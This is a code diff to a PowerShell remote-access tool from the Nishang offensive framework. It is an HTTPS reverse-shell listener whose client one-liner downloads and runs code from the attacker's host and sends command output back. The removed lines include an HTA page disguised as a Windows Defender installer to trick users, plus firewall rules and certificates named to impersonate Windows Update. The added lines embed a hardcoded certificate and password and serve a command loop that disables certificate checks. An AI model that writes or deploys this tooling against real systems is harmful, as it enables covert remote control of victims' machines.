@@ -5,16 +5,21 @@ function Invoke-PoshRatHttps
 Nishang script which can be used for Reverse interactive PowerShell from a target over HTTPS.
 
 .DESCRIPTION
-This script starts a listener on the attacker's machine. The listener needs two ports, one for unencrypted initial
-connect and another for encrypted channel. 
+This script starts a listener on the attacker's machine. The listener listens on Port 443 by default.
 
 On the target machine execute the below command from PowerShell:
-iex (New-Object Net.WebClient).DownloadString("http://IPAddress/connect")
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+iex (New-Object Net.WebClient).DownloadString("https://IPAddress:Port/connect")
 
-or trick a user in connecting to: https://IPAddress/WindowsDefender.hta
+The listener opens incoming traffic on the specified port. The firewall rules are named "Windows Update HTTPS".
 
-The listener installs certificates by the name of "Windows Update Agent" and the IPAddress specifed on the attacker's machine and opens incoming
-traffic on the specified ports. The firewall rules are named "Windows Update HTTPS" and "Windows Update HTTP".
+A Base64 encoded script is hardcoded in the script, you can use the below commands for generating a certificate.
+makecert.exe -sr localmachine -ss MY -a sha1 -n "CN=PoshRat Root CA" -sky signature -pe -r "Root.cer" -sv "RootKey.pvk"
+makecert.exe -sr localmachine -ss MY -a sha1 -n "CN=PoshRat" -sky exchange -pe -ir localmachine  -iv "RootKey.pvk" -ic "Root.cer"
+Export From LocalMachine Store With Private Key.
+Base64 Encode File
+$Content = Get-Content -Path File.pvk -Encoding Byte
+$Base64Cert = [System.Convert]::ToBase64String($Content)
 
 The script has been originally written by Casey Smith (@subTee)
 
@@ -22,16 +27,13 @@ The script has been originally written by Casey Smith (@subTee)
 The IP address on which the listener listens. Make sure that the IP address specified here is reachable from the target.
 
 .PARAMETER Port
-The port on which initial unecnrypted connection is establised. 
-
-.PARAMETER SSLPort
-The port on which encrypted communication is established. 
+The port on which the ecnrypted connection is establised. 
 
 .EXAMPLE
-PS > Invoke-PoshRatHttps -IPAddress 192.168.254.1 -Port 80 -SSLPort 443
+PS > Invoke-PoshRatHttps -IPAddress 192.168.254.1 -Port 8443
 
 Above shows an example where the listener starts on port 80 and 443. On the client execute:
-iex (New-Object Net.WebClient).DownloadString("http://192.168.254.1/connect")
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};iex (New-Object Net.WebClient).DownloadString("https://192.168.254.1:8443/connect")
 
 .LINK
 http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-3.html
@@ -46,236 +48,125 @@ https://github.com/samratashok/nishang
 
         [Parameter(Position = 1, Mandatory = $true)]
         [Int]
-        $Port,
-
-        [Parameter(Position = 2, Mandatory = $true)]
-        [Int]
-        $SSLPort
+        $Port
 
     )
 
-    function Invoke-CreateCertificate([string] $certSubject, [bool] $isCA)
-    {
-	    $CAsubject = $certSubject
-	    $dn = new-object -com "X509Enrollment.CX500DistinguishedName"
-	    $dn.Encode( "CN=" + $CAsubject, $dn.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
-	    #Issuer Property for cleanup
-	    $issuer = "Microsoft Windows Update"
-	    $issuerdn = new-object -com "X509Enrollment.CX500DistinguishedName"
-	    $issuerdn.Encode("CN=" + $issuer, $dn.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
-	    # Create a new Private Key
-	    $key = new-object -com "X509Enrollment.CX509PrivateKey"
-	    $key.ProviderName = "Microsoft Enhanced Cryptographic Provider v1.0"
-	    # Set CAcert to 1 to be used for Signature
-	    if($isCA)
-		{
-			$key.KeySpec = 2 
-		}
-	    else
-		{
-			$key.KeySpec = 1
-		}
-	    $key.Length = 1024
-	    $key.MachineContext = 1
-	    $key.Create() 
-	 
-	    # Create Attributes
-	    $serverauthoid = new-object -com "X509Enrollment.CObjectId"
-	    $serverauthoid.InitializeFromValue("1.3.6.1.5.5.7.3.1")
-	    $ekuoids = new-object -com "X509Enrollment.CObjectIds.1"
-	    $ekuoids.add($serverauthoid)
-	    $ekuext = new-object -com "X509Enrollment.CX509ExtensionEnhancedKeyUsage"
-	    $ekuext.InitializeEncode($ekuoids)
-
-	    $cert = new-object -com "X509Enrollment.CX509CertificateRequestCertificate"
-	    $cert.InitializeFromPrivateKey(2, $key, "")
-	    $cert.Subject = $dn
-	    $cert.Issuer = $issuerdn
-	    #Backup One day to Avoid Timing Issues
-        $cert.NotBefore = (get-date).AddDays(-1) 
-        #Arbitrary... Change to persist longer...
-	    $cert.NotAfter = $cert.NotBefore.AddDays(90) 
-	    $cert.X509Extensions.Add($ekuext)
-	    if ($isCA)
-	    {
-		    $basicConst = new-object -com "X509Enrollment.CX509ExtensionBasicConstraints"
-		    $basicConst.InitializeEncode("true", 1)
-		    $cert.X509Extensions.Add($basicConst)
-	    }
-	    else
-	    {              
-		    $signer = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match "Windows Update Agent" })
-		    $signerCertificate =  new-object -com "X509Enrollment.CSignerCertificate"
-		    $signerCertificate.Initialize(1,0,4, $signer.Thumbprint)
-		    $cert.SignerCertificate = $signerCertificate
-	    }
-	    $cert.Encode()
-
-	    $enrollment = new-object -com "X509Enrollment.CX509Enrollment"
-	    $enrollment.InitializeFromRequest($cert)
-	    $certdata = $enrollment.CreateRequest(0)
-	    $enrollment.InstallResponse(2, $certdata, 0, "")
-
-	    if($isCA)
-	    {              
-									
-		    $CACertificate = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match "Windows Update Agent" })
-		    # Install CA Root Certificate
-		    $StoreScope = "LocalMachine"
-		    $StoreName = "Root"
-		    $store = New-Object System.Security.Cryptography.X509Certificates.X509Store $StoreName, $StoreScope
-		    $store.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::ReadWrite)
-		    $store.Add($CACertificate)
-		    $store.Close()
-									
-	    }
-	    else
-	    {
-		    return (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match $CAsubject })
-	    } 
-     
-    }
-
-
-    function Receive-Request 
-    {
-       param(      
-          $Request
-       )
-       $output = ""
-       $size = $Request.ContentLength64 + 1   
-       $buffer = New-Object byte[] $size
-       do 
-       {
-          $count = $Request.InputStream.Read($buffer, 0, $size)
-          $output += $Request.ContentEncoding.GetString($buffer, 0, $count)
-       } 
-       until($count -lt $size)
-       $Request.InputStream.Close()
-       write-host $output
-    }
 
     #Certificate Setup For SSL/TLS
-    #Create and Install the CACert
-    $CAcertificate = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match "Windows Update Agent"  })
-    if ($CACertificate -eq $null)
+    #Certificate is not installed on the listener.
+    $Base64Cert = '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'
+
+    $CertPassword = 'password'
+    $CertPinThumbprint = (New-Object System.Security.Cryptography.X509Certificates.X509Certificate2([System.Convert]::FromBase64String($Base64Cert), $CertPassword)).Thumbprint
+
+
+    function Receive-ClientHttpsRequest([System.Net.Sockets.TcpClient] $client)
     {
-	    Invoke-CreateCertificate "Windows Update Agent" $true
-    }
-
-    try
-    {
-        $isSSL = $true
-        $listener = New-Object System.Net.HttpListener
-
-        $sslcertfake = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match $IPAddress })
-        if ($sslcertfake -eq $null)
-        {
-	        $sslcertfake =  Invoke-CreateCertificate $IPAddress $false
-        }
-        $sslThumbprint = $sslcertfake.Thumbprint 
-        $installCert = "netsh http add sslcert ipport=`"$IPAddress`":`"$SSLPort`" certhash=$sslThumbprint appid='{e46ad221-627f-4c05-9bb6-2529ae1fa815}'"
-        Invoke-Expression $installCert
-        Write-Output 'SSL Certificates Installed...'
-        $listener.Prefixes.Add("https://+:$SSLPort/") #HTTPS Listener
-        $listener.Prefixes.Add("http://+:$Port/") #HTTP Initial Connect
-
-        #Create Firewall Rules
-        netsh advfirewall firewall delete rule name="WindowsUpdate HTTPS" | Out-Null
-        netsh advfirewall firewall add rule name="WindowsUpdate HTTPS" dir=in action=allow protocol=TCP localport=$SSLPort | Out-Null
-        netsh advfirewall firewall delete rule name="WindowsUpdate HTTP" | Out-Null
-        netsh advfirewall firewall add rule name="WindowsUpdate HTTP" dir=in action=allow protocol=TCP localport=$Port | Out-Null
-
-        $listener.Start()
-        Write-Output "Listening on $SSLPort"
-        while ($true) 
-        {
-            $context = $listener.GetContext() # blocks until request is received
-            $request = $context.Request
-            $response = $context.Response
-	        $hostip = $request.RemoteEndPoint
-	        #Use this for One-Liner Start
-	        if ($request.Url -match '/connect$' -and ($request.HttpMethod -eq "GET")) 
-            {  
-                $message = "
-		            			
-                            `$s = `"https://$IPAddress`:$SSLPort/rat`"
-					        `$w = New-Object Net.WebClient 
-					        while(`$true)
-					        {
-					        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
-					        `$r = `$w.DownloadString(`$s)
-					        while(`$r) {
-						        `$o = invoke-expression `$r | out-string 
-						        `$w.UploadString(`$s, `$o)	
-						        break
-					        }
-					        }
-		        "
-
-            }		 
 	
-	        if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "POST") ) 
-            { 
-		        Receive-Request($request)	
-	        }
-            if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "GET")) 
-            {  
-                $response.ContentType = 'text/plain'
-                $message = Read-Host "PS $hostip>"		
-            }
-            if ($request.Url -match '/WindowsDefender.hta$' -and ($request.HttpMethod -eq "GET")) 
-            {
-		        $enc = [system.Text.Encoding]::UTF8
-		        $response.ContentType = 'application/hta'
-                $Htacode = @"
-                <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-                <html xmlns="http://www.w3.org/1999/xhtml">
-                <head>
-                <meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
-                <title>Windows Defender Web Install</title>
-                <SCRIPT Language="VBScript">
-                Sub Initialize()
-                Set oShell = CreateObject("WScript.Shell")
-                ps = "powershell.exe -ExecutionPolicy Bypass -noprofile -c IEX ((new-object net.webclient).downloadstring('http://$IPAddress`:$Port/connect'))"
-                oShell.run(ps),0,true
-                End Sub
-                </script>
-                <hta:application
-                   id="oHTA"
-                   applicationname="Windows Defender Web Install"
-                   application="yes"
-                >
-                </hta:application>
-                </head>
+    $clientStream = $client.GetStream()		
+    $SSLStream = New-Object System.Net.Security.SslStream($clientStream , $false)
 
-                </SCRIPT>
-                <div> 
-                <body onload="Initialize()">
-                <object type="text/html" data="http://windows.microsoft.com/en-IN/windows7/products/features/windows-defender" width="100%" height="100%">
-                </object></div>   
-                </body>
-                </html>
-"@
-		    
-		        $buffer = $enc.GetBytes($htacode)		
-		        $response.ContentLength64 = $buffer.length
-		        $output = $response.OutputStream
-		        $output.Write($buffer, 0, $buffer.length)
-		        $output.Close()
-		        continue
-	        }
-            [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
-            $response.ContentLength64 = $buffer.length
-            $output = $response.OutputStream
-            $output.Write($buffer, 0, $buffer.length)
-            $output.Close()
-        }
-        $listener.Stop()
+    $SSLcertfake = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2([System.Convert]::FromBase64String($Base64Cert), $CertPassword)
+    $SSLThumbprint = $SSLcertfake.Thumbprint
+
+    $SSLStream.AuthenticateAsServer($SSLcertfake, $false, [System.Security.Authentication.SslProtocols]::Tls, $false)
+
+    $SSLbyteArray = new-object System.Byte[] 8192
+    [void][byte[]] $SSLbyteClientRequest
+
+    do 
+     {
+	    [int] $NumBytesRead = $SSLStream.Read($SSLbyteArray, 0, $SSLbyteArray.Length) 
+	    $SSLbyteClientRequest += $SSLbyteArray[0..($NumBytesRead - 1)]  
+     } while ( $clientStream.DataAvailable  )
+
+    $SSLRequest = [System.Text.Encoding]::UTF8.GetString($SSLbyteClientRequest)
+
+    [string[]] $SSLRequestArray = ($SSLRequest -split '[\r\n]') |? {$_} 
+
+    [string[]] $SSLParse = $SSLRequestArray[0] -split ' '
+    $SSLMethod = $SSLParse[0]
+    $SSLURL = $SSLParse[1]
+    $SSLResponse = 'HTTP/1.1 200 OK
+Content-Type: text/xml; charset=utf-8
+
+'
+    if ($SSLURL -eq '/connect' -and ($SSLMethod -eq 'GET')) {
+    Write-Output "Connect Request Received"
+    $SSLResponse += '
+$SSLThumbprint = "'+$SSLThumbprint+'"
+
+function Invoke-CertCheck()
+{	
+	$Uri = "https://' + $IPAddress+':'+$Port + '/rat"
+	[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+	$request = [System.Net.HttpWebRequest]::Create($uri)
+	$request.GetResponse().Dispose()
+	$servicePoint = $request.ServicePoint
+	[System.Security.Cryptography.X509Certificates.X509Certificate2]$cert = $servicePoint.Certificate
+	return $cert.Thumbprint
+}
+
+$p = [System.Net.WebRequest]::GetSystemWebProxy()
+$s = "https://' + $IPAddress+':'+$Port + '/rat"
+$w = New-Object Net.WebClient 
+$w.Proxy = $p
+$r = "hostname" 
+do
+{
+	
+	while($r) {
+		[string]$o = invoke-expression $r | out-string 
+		$w.UploadString($s, $o)	| out-null
+		break
+	}
+	$r = $w.DownloadString($s) 
+} while($true)
+
+'
+
+}		 
+
+    if ($SSLURL -eq '/rat' -and ($SSLMethod -eq "POST") ) { 
+    Write-Output ([System.Text.Encoding]::Ascii.GetString($SSLbyteClientRequest))
     }
-    catch
+    if ($SSLUrl -eq '/rat' -and ($SSLMethod-eq "GET")) {  
+	
+    $Command = Read-Host "PS $IPAddress>"
+    $SSLResponse += "$Command"
+
+
+    }
+
+    [byte[]] $Buffer = [System.Text.Encoding]::UTF8.GetBytes($SSLResponse)
+    $SSLStream.Write($Buffer, 0, $Buffer.length)
+
+    $Client.Close()
+    }
+
+
+    $endpoint = New-Object System.Net.IPEndPoint ([system.net.ipaddress]::any, $Port)
+    $listener = New-Object System.Net.Sockets.TcpListener $endpoint
+
+    #This sets up a local firewall rule to suppress the Windows "Allow Listening Port Prompt"
+    netsh advfirewall firewall delete rule name="PoshRat Server $Port" | Out-Null #First Run May Throw Error...Thats Ok..:)
+    netsh advfirewall firewall add rule name="PoshRat Server $Port" dir=in action=allow protocol=TCP localport=$Port | Out-Null
+
+    $listener.Start()
+    Write-Output "Listening on $Port"
+    Write-Output $CertPinThumbprint
+    $Client = New-Object System.Net.Sockets.TcpClient
+    $Client.NoDelay = $true
+
+    while($true)
     {
-        Write-Warning "Something went wrong! Check if client could reach the server and using the correct port." 
-        Write-Error $_
+
+    $Client = $listener.AcceptTcpClient()
+    if($Client -ne $null)
+    {
+	    Receive-ClientHttpsRequest $Client
+    }
+
     }
 }
